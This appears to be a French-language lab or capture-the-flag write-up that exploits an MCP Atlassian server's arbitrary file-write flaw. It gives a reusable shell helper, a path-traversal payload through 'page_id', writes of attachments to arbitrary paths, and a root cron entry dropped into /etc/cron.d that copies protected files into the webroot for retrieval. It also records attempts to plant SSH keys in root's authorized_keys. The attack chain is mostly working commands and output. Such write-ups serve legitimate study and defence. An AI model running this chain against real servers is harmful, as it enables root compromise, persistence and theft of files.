## 1. Résumé exécutif

Le lab exposait un serveur MCP Atlassian en SSE sur le port **9000**. L'outil `confluence_download_attachment` acceptait un chemin de destination arbitraire, comportement correspondant à la vulnérabilité d'écriture de fichier décrite pour CVE-2026-27825. En parallèle, un serveur HTTP statique sur le port **8080** servait le répertoire `/var/www/html` du même environnement que le serveur MCP : cette relation a été vérifiée en écrivant une copie d'une pièce jointe sous `/var/www/html/mer-probe.txt`, puis en la lisant via HTTP.

Le chemin vers le flag :

1. Découverte des services
2. Énumération des outils MCP
3. Contournement de route par `page_id`
4. Découverte d'une page Confluence valide
5. Confirmation de l'écriture arbitraire et du répertoire web partagé
6. Dépôt d'une tâche cron au moyen d'une pièce jointe
7. Lecture du fichier résultat via le port 8080

## 3. Connexion et découverte du protocole MCP

### 3.1 Transport SSE

L'endpoint SSE fonctionnel :

```bash
curl -N "http://176.16.174.39:9000/sse"
```

**Réponse observée :**

```
event: endpoint
data: /messages/?session_id=<identifiant-de-session>
```

Il fallait conserver le `session_id` fourni, puis envoyer les requêtes JSON-RPC à `/messages/?session_id=...`.

**Requête d'initialisation :**

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "initialize",
  "params": {
    "protocolVersion": "2024-11-05",
    "capabilities": {},
    "clientInfo": {"name": "lab", "version": "1.0"}
  }
}
```

**Réponse MCP abrégée :**

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "result": {
    "protocolVersion": "2024-11-05",
    "capabilities": {
      "experimental": {},
      "prompts": {"listChanged": false},
      "resources": {"subscribe": false, "listChanged": false},
      "tools": {"listChanged": false}
    },
    "serverInfo": {"name": "mcp-atlassian", "version": "1.26.0"}
  }
}
```

**Notification d'initialisation :**

```json
{"jsonrpc": "2.0", "method": "notifications/initialized"}
```

> Le point d'entrée `/mcp` a répondu `HTTP/1.1 404 Not Found`. Les échanges suivants ont donc utilisé le transport SSE confirmé.

### 3.2 Outils exposés

L'appel `tools/list` a révélé six outils :

| Outil | Description |
|---|---|
| `confluence_search` | Recherche CQL dans Confluence |
| `confluence_get_page` | Récupération de page par ID |
| `confluence_list_spaces` | Liste des espaces |
| `confluence_list_attachments` | Liste des pièces jointes |
| `confluence_upload_attachment` | Upload d'une pièce jointe (`page_id`, `filename`, `content`) |
| `confluence_download_attachment` | **Téléchargement vers un chemin local arbitraire** (`attachment_id`, `download_path`) |

> Le serveur annonçait la version `mcp-atlassian 1.26.0`. L'avis CVE et l'avis GitHub décrivent la vulnérabilité upstream comme affectant les versions antérieures à 0.17.0. L'écart entre ce numéro upstream et le `serverInfo` observé empêche d'identifier la version du paquet sous-jacent à partir de cette seule bannière ; le rapport conclut sur le **comportement effectivement testé**.

## 4. Découverte de la page Confluence et path traversal de route

L'espace ENG avait l'identifiant **65540**. Les premiers essais (`page_id=65540`, `200000`, `200001`) ont échoué : 65540 était un ID d'espace, non un ID de page.

Un argument `page_id` contenant un segment de remontée a toutefois été interprété comme partie du chemin de l'API interne. La forme à un niveau a permis d'interroger la liste des pages :

```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "method": "tools/call",
  "params": {
    "name": "confluence_get_page",
    "arguments": {"page_id": "../pages?space-id=65540&limit=100"}
  }
}
```

**Sortie utile :**

```json
{
  "results": [{
    "body": {"storage": {"representation": "storage", "value": "<p>Sprint planning notes for Q1 2026.</p>"}},
    "id": "101001",
    "spaceId": "65540",
    "status": "current",
    "title": "Q1 Sprint Planning"
  }]
}
```

La page valide était donc **101001**, intitulée *Q1 Sprint Planning*, dans l'espace ENG.

**Récupération des métadonnées de la pièce jointe :**

```json
{
  "jsonrpc": "2.0",
  "id": 4,
  "method": "tools/call",
  "params": {
    "name": "confluence_get_page",
    "arguments": {"page_id": "../attachments/att200001"}
  }
}
```

**Sortie observée :**

```json
{
  "fileSize": 84,
  "id": "att200001",
  "mediaType": "text/plain",
  "pageId": "101001",
  "status": "current",
  "title": "meeting-notes.txt"
}
```

## 5. Confirmation de l'écriture arbitraire et du répertoire web partagé

### 5.0 Fonction shell réutilisable (helper MCP)

```bash
IP=176.16.174.39

mcp_call() {
  local payload="$1" rid="$2" log sid pid
  log=$(mktemp)
  curl -sN "http://$IP:9000/sse" >"$log" 2>&1 &
  pid=$!
  for _ in $(seq 1 20); do
    sid=$(sed -n 's/.*session_id=//p' "$log" | head -n1 | tr -d '\r')
    [ -n "$sid" ] && break
    sleep 0.25
  done
  if [ -z "$sid" ]; then
    cat "$log"; kill "$pid" 2>/dev/null; rm -f "$log"; return 1
  fi

  post_mcp() {
    curl -sS -X POST "http://$IP:9000/messages/?session_id=$sid" \
      -H 'Content-Type: application/json' --data-binary "$1" >/dev/null
  }

  post_mcp '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"lab","version":"1.0"}}}'
  sleep 1
  post_mcp '{"jsonrpc":"2.0","method":"notifications/initialized"}'
  post_mcp "$payload"
  sleep 3
  grep -A1 "\"id\":$rid" "$log"
  kill "$pid" 2>/dev/null
  rm -f "$log"
}
```

### 5.1 Lecture/téléchargement vers un chemin local

```bash
mcp_call '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"confluence_download_attachment","arguments":{"attachment_id":"att200001","download_path":"/opt/app/meeting-notes.txt"}}}' 2
```

**Réponse observée :**

```json
{
  "status": "success",
  "attachment_id": "att200001",
  "title": "meeting-notes.txt",
  "size": 84,
  "saved_to": "/opt/app/meeting-notes.txt"
}
```

> Cela confirme que `download_path` est utilisé comme destination d'écriture, conformément au défaut de validation de chemin décrit par la fiche CVE et l'avis GitHub.

### 5.2 Preuve contrôlée sur le webroot

```bash
mcp_call '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"confluence_download_attachment","arguments":{"attachment_id":"att200001","download_path":"/var/www/html/mer-probe.txt"}}}' 2
```

**Réponse MCP :**

```json
{"status": "success", ..., "saved_to": "/var/www/html/mer-probe.txt"}
```

**Vérification HTTP :**

```bash
curl -sS -i http://176.16.174.39:8080/mer-probe.txt
```

**Retour HTTP 200 :**

```
Meeting notes - Q1 sprint planning.
Action items:
- Review backlog
- Assign stories
```

> **Déduction déterminante :** `/var/www/html` était accessible en écriture par l'outil MCP **et** exposé par le serveur statique sur le port 8080. Ce canal a fourni la primitive d'exfiltration du résultat cron.

## 7. Récupération du flag par tâche cron

### 7.1 Contenu téléversé

La pièce jointe dédiée a été ajoutée à la page **101001** avec le contenu suivant :

```
* * * * * root cat /home/local.txt /root/proof.txt > /var/www/html/flag.txt 2>&1; rm -f /etc/cron.d/mer-flag
```

**Appel JSON-RPC d'upload :**

```json
{
  "jsonrpc": "2.0",
  "id": 2,
  "method": "tools/call",
  "params": {
    "name": "confluence_upload_attachment",
    "arguments": {
      "page_id": "101001",
      "filename": "mer-cron.txt",
      "content": "* * * * * root cat /home/local.txt /root/proof.txt > /var/www/html/flag.txt 2>&1; rm -f /etc/cron.d/mer-flag\n"
    }
  }
}
```

**Réponse de l'upload :**

```json
{
  "fileSize": 109,
  "id": "attbcca3471",
  "mediaType": "application/octet-stream",
  "pageId": "101001",
  "status": "current",
  "title": "mer-cron.txt"
}
```

**Commande shell complète :**

```bash
CRON='* * * * * root cat /home/local.txt /root/proof.txt > /var/www/html/flag.txt 2>&1; rm -f /etc/cron.d/mer-flag'
UPLOAD=$(python3 -c 'import json,sys; print(json.dumps({"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"confluence_upload_attachment","arguments":{"page_id":"101001","filename":"mer-cron.txt","content":sys.argv[1]+"\n"}}}))' "$CRON")
mcp_call "$UPLOAD" 2
# → ID : attbcca3471 | fileSize: 109
```

### 7.2 Écriture de la tâche dans /etc/cron.d/

```bash
mcp_call '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"confluence_download_attachment","arguments":{"attachment_id":"attbcca3471","download_path":"/etc/cron.d/mer-flag"}}}' 2
```

**Interprétation de la ligne cron :**

| Champ | Valeur | Signification |
|---|---|---|
| Planification | `* * * * *` | Déclenchement chaque minute |
| Utilisateur | `root` | Format `/etc/cron.d` |
| Commande | `cat /home/local.txt /root/proof.txt` | Lecture des deux fichiers attendus |
| Redirection | `> /var/www/html/flag.txt 2>&1` | Sortie + erreurs vers le webroot |
| Nettoyage | `; rm -f /etc/cron.d/mer-flag` | Auto-suppression après exécution |

> L'écriture d'une entrée cron est également citée comme exemple d'impact dans la fiche CVE officielle et l'avis de sécurité du projet.

### 7.3 Lecture du résultat

```bash
IP=176.16.174.39
for i in $(seq 1 15); do
  echo "===== essai $i ====="
  curl -sS --max-time 3 -w '\nHTTP %{http_code}\n' \
    "http://$IP:8080/flag.txt"

  sleep 5
done
```

Les 11 premiers essais répondaient `404`. À partir de l'essai 12 :

```

cat: /root/proof.txt: No such file or directory

```

**Confirmation directe :**


## 9. État des modifications et nettoyage

**Fichiers écrits sur la cible :**

- `/opt/app/meeting-notes.txt`
- `/var/www/html/mer-probe.txt`
- `/usr/share/nginx/html/mer-probe.txt`, `/srv/www/mer-probe.txt`, `/opt/app/static/mer-probe.txt`, `/opt/app/public/mer-probe.txt`, `/opt/app/mer-probe.txt`, `/tmp/mer-probe.txt`
- `/etc/cron.d/mer-flag` (auto-suppression incluse, non vérifiée)
- `/var/www/html/flag.txt`

**Pièces jointes créées sur la page 101001 :**

- `mer-lab-key.pub`, `content-probe.txt`, `local-copy.txt`, `mer-cron.txt`

**Tentatives d'écriture de clé SSH :**

- `/root/.ssh/authorized_keys2`, `/root/.ssh/authorized_keys`
- `/home/ubuntu/.ssh/authorized_keys`, `/home/local/.ssh/authorized_keys`
- → Connexions SSH refusées dans les trois cas

> **Conseil de remise en état :** supprimer les fichiers de test confirmés, vérifier et retirer `/etc/cron.d/mer-flag` s'il existe encore, retirer les clés SSH éventuellement déposées. Ne pas utiliser l'outil d'écriture pour déposer une chaîne vide : cela tronque le fichier sans le supprimer. Les pièces jointes Confluence peuvent être supprimées via les fonctions d'administration du lab.

## 10. Limites de la retranscription

Les commandes MCP réutilisaient souvent un même squelette (ouverture SSE → `session_id` → `initialize` → `notifications/initialized` → `tools/call`). Pour éviter la répétition, ce rapport reproduit les requêtes JSON-RPC déterminantes et conserve les sorties pertinentes. La confirmation brute de l'écriture cron n'est pas présente dans les extraits transmis ; le succès d'exécution est établi par l'apparition ultérieure de `flag.txt` via HTTP et par son corps observé.
